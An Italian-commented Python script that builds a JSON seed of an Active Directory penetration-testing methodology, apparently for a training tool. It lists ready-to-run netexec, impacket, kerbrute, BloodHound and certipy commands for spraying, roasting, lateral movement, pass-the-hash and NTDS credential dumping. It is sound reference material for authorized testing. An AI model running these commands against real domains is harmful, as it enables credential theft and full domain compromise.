#!/usr/bin/env python3
"""
Genera data/ad_seed.json: metodologia di pentest su Active Directory, curata a
mano. Riferimenti STANDARD e noti (netexec, impacket, BloodHound, certipy...).
Nei comandi i segnaposto (<dc-ip>, <user>, acme.local) vanno adattati al
dominio reale e AUTORIZZATO.

Uso:  python tools/build_ad.py
"""
import json
from pathlib import Path

REF = "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology"


def T(name, description, intro, checks):
    return {"kind": "ad", "name": name, "description": description,
            "intro": intro, "detection": None, "references": REF, "checks": checks}


def c(title, goal, tool, command, interpretation):
    return {"title": title, "goal": goal, "tool": tool,
            "command": command, "interpretation": interpretation, "references": None}


TOPICS = [
    T("Enumerazione del dominio",
      "Raccogliere utenti, gruppi, share e policy (con o senza credenziali).",
      "Il primo passo in Active Directory e' capire com'e' fatto il dominio: utenti, "
      "gruppi, share, policy delle password, relazioni di fiducia.\n"
      "Si parte da quello che si ha: a volte nulla (si tenta l'accesso anonimo), a volte "
      "un utente di basso livello. Anche un singolo account 'normale' permette di "
      "enumerare quasi tutto il dominio via SMB e LDAP.", [
        c("Enumerazione senza credenziali", "Vedere cosa e' accessibile in modo anonimo.",
          "netexec / enum4linux-ng",
          "netexec smb <dc-ip> -u '' -p ''    # e:  enum4linux-ng -A <dc-ip>",
          "Rivela OS, nome del dominio e, se abilitata, la null session (utenti/share senza credenziali)."),
        c("Enumerazione con credenziali", "Elencare utenti, gruppi e share del dominio.",
          "netexec",
          "netexec smb <dc-ip> -u <user> -p <pass> --users --groups --shares",
          "Lista completa di utenti e gruppi: base per spraying, roasting e per individuare account privilegiati."),
        c("Interrogazione LDAP", "Leggere oggetti e attributi dalla directory.",
          "ldapsearch",
          "ldapsearch -x -H ldap://<dc-ip> -D '<user>@acme.local' -w '<pass>' -b 'DC=acme,DC=local'",
          "Utenti, gruppi, computer e attributi (es. descrizioni con password, SPN, deleghe)."),
      ]),
    T("BloodHound",
      "Mappare le relazioni del dominio e trovare i percorsi verso Domain Admin.",
      "BloodHound raccoglie i dati del dominio e li mostra come un grafo: chi e' membro di "
      "cosa, chi ha controllo su chi, quali macchine. Serve a individuare i 'percorsi di "
      "attacco' non ovvi che portano da un utente qualsiasi fino a Domain Admin.\n"
      "Prima si raccolgono i dati (SharpHound / bloodhound-python), poi si analizzano "
      "nell'interfaccia.", [
        c("Raccolta dati", "Generare il dataset da caricare in BloodHound.",
          "bloodhound-python",
          "bloodhound-python -d acme.local -u <user> -p <pass> -ns <dc-ip> -c All",
          "Produce file JSON da importare in BloodHound (o un .zip con SharpHound da macchina Windows)."),
        c("Analisi dei percorsi", "Trovare la strada piu' breve verso i privilegi massimi.",
          "BloodHound",
          "Importa i dati, poi usa la query 'Shortest Paths to Domain Admins'",
          "Evidenzia catene sfruttabili (appartenenze, ACL, sessioni): la mappa di cosa attaccare."),
      ]),
    T("Password spraying",
      "Provare poche password comuni su molti utenti, evitando il blocco account.",
      "A differenza del brute force (molte password su un utente, che fa scattare il "
      "lockout), lo spraying prova 1-2 password molto comuni su TUTTI gli utenti del "
      "dominio. E' efficace perche' in ogni azienda qualcuno usa password prevedibili "
      "(es. nome dell'azienda + anno).\n"
      "Va fatto con prudenza, rispettando la policy di lockout per non bloccare account.", [
        c("Spray con netexec", "Testare una password comune su una lista di utenti.",
          "netexec",
          "netexec smb <dc-ip> -u users.txt -p 'Acme2025!' --continue-on-success",
          "Un '[+]' indica credenziali valide. Controlla prima la soglia di lockout (policy password)."),
        c("Spray con kerbrute", "Alternativa via Kerberos (piu' silenziosa).",
          "kerbrute",
          "kerbrute passwordspray -d acme.local --dc <dc-ip> users.txt 'Acme2025!'",
          "Valido/non valido per ogni utente, senza generare eventi di logon tradizionali."),
      ]),
    T("AS-REP Roasting",
      "Ottenere hash crackabili dagli utenti senza pre-autenticazione Kerberos.",
      "Alcuni account hanno l'opzione 'non richiedere la pre-autenticazione Kerberos'. Per "
      "questi, chiunque puo' richiedere un messaggio AS-REP il cui hash e' crackabile "
      "offline, SENZA conoscere la password e spesso senza alcuna credenziale.\n"
      "E' un attacco rapido da provare in fase iniziale.", [
        c("Estrazione hash AS-REP", "Trovare utenti senza preauth e prenderne l'hash.",
          "impacket-GetNPUsers",
          "impacket-GetNPUsers acme.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip>",
          "Un hash '$krb5asrep$' si cracca offline (hashcat -m 18200). Password debole = credenziali valide."),
      ]),
    T("Kerberoasting",
      "Crackare le password degli account di servizio (con SPN) offline.",
      "Gli account di servizio hanno un SPN (Service Principal Name). Qualsiasi utente "
      "autenticato puo' richiedere un ticket di servizio (TGS) per quegli account: il "
      "ticket contiene un hash crackabile offline.\n"
      "Gli account di servizio hanno spesso password deboli e non scadono mai: per questo "
      "il Kerberoasting e' uno degli attacchi piu' redditizi in AD. Richiede un account valido.", [
        c("Richiesta e estrazione TGS", "Prendere gli hash degli account con SPN.",
          "impacket-GetUserSPNs",
          "impacket-GetUserSPNs acme.local/<user>:<pass> -dc-ip <dc-ip> -request",
          "Gli hash '$krb5tgs$' si crackano offline (hashcat -m 13100). Spesso rivelano password di servizio deboli."),
      ]),
    T("Movimento laterale ed esecuzione",
      "Con credenziali o hash, eseguire comandi su altre macchine del dominio.",
      "Una volta ottenute delle credenziali (o un hash), l'obiettivo e' usarle per "
      "spostarsi su altre macchine ed eseguire comandi, avvicinandosi ai sistemi di "
      "valore. I protocolli piu' usati sono SMB (psexec/wmiexec) e WinRM.\n"
      "Prima si verifica DOVE quelle credenziali danno accesso, poi si ottiene una shell.", [
        c("Dove ho accesso?", "Verificare su quali host le credenziali funzionano.",
          "netexec",
          "netexec smb <subnet>/24 -u <user> -p <pass>",
          "'(Pwn3d!)' indica privilegi amministrativi su quell'host (esecuzione comandi possibile)."),
        c("Shell / esecuzione", "Ottenere una shell su una macchina accessibile.",
          "impacket / evil-winrm",
          "impacket-psexec acme.local/<user>:<pass>@<ip>    # o:  evil-winrm -i <ip> -u <user> -p <pass>",
          "Shell remota con i privilegi dell'utente: da qui si cercano credenziali e si prosegue."),
      ]),
    T("Dump delle credenziali",
      "Estrarre hash e segreti da una macchina compromessa.",
      "Ottenuto l'accesso privilegiato a una macchina, si estraggono le credenziali li' "
      "presenti: hash locali (SAM), segreti (LSA), credenziali in memoria (LSASS) e, su un "
      "Domain Controller, l'intero database del dominio (NTDS.dit).\n"
      "Le credenziali raccolte alimentano nuovi accessi (riuso, Pass-the-Hash): e' il motore "
      "della progressione in AD.", [
        c("Segreti locali", "Prendere hash SAM e segreti LSA.",
          "netexec / secretsdump",
          "netexec smb <ip> -u <user> -p <pass> --sam --lsa    # o:  impacket-secretsdump acme.local/<user>:<pass>@<ip>",
          "Hash NTLM locali e segreti (spesso password di servizio in chiaro). Riutilizzali altrove."),
        c("Dump del dominio (NTDS)", "Da Domain Admin, estrarre tutti gli hash del dominio.",
          "secretsdump",
          "impacket-secretsdump acme.local/<admin>:<pass>@<dc-ip> -just-dc",
          "Tutti gli hash degli utenti di dominio: compromissione totale. Da usare solo a obiettivo raggiunto."),
      ]),
    T("Pass-the-Hash",
      "Autenticarsi con l'hash NTLM, senza conoscere la password.",
      "In Windows, per autenticarsi via NTLM basta l'hash della password, non la password "
      "in chiaro. Se hai ottenuto un hash (es. dal dump credenziali), puoi usarlo "
      "direttamente per accedere ad altri sistemi dove quell'utente e' valido.\n"
      "E' il motivo per cui un singolo hash amministrativo riutilizzato puo' compromettere "
      "molte macchine.", [
        c("Accesso con hash", "Usare l'hash NTLM al posto della password.",
          "netexec / impacket",
          "netexec smb <ip> -u <user> -H <NTLM-hash>    # o:  impacket-psexec -hashes :<NTLM> acme.local/<user>@<ip>",
          "Se ottieni accesso/'(Pwn3d!)', l'hash e' valido su quell'host: movimento laterale senza crackare nulla."),
      ]),
    T("ADCS - certificati (ESC)",
      "Abusare di template di certificato mal configurati per l'escalation.",
      "Active Directory Certificate Services (ADCS) rilascia certificati. Se i template "
      "sono configurati male, un utente poco privilegiato puo' richiedere un certificato "
      "che gli permette di autenticarsi come un altro utente (anche Domain Admin).\n"
      "Sono le famose tecniche 'ESC1', 'ESC8', ecc.: spesso una via rapida verso il "
      "dominio quando ADCS e' presente.", [
        c("Trova template vulnerabili", "Individuare configurazioni ESC sfruttabili.",
          "certipy",
          "certipy find -u <user>@acme.local -p <pass> -dc-ip <dc-ip> -vulnerable",
          "Elenca i template vulnerabili (ESC1, ESC8...). Ognuno ha una tecnica di abuso documentata per l'escalation."),
      ]),
]


def main():
    out = Path(__file__).resolve().parent.parent / "data" / "ad_seed.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps({"source": "curato a mano", "topics": TOPICS}, ensure_ascii=False, indent=2), encoding="utf-8")
    n = sum(len(t["checks"]) for t in TOPICS)
    print(f"Scritte {len(TOPICS)} voci AD e {n} test in {out}")


if __name__ == "__main__":
    main()
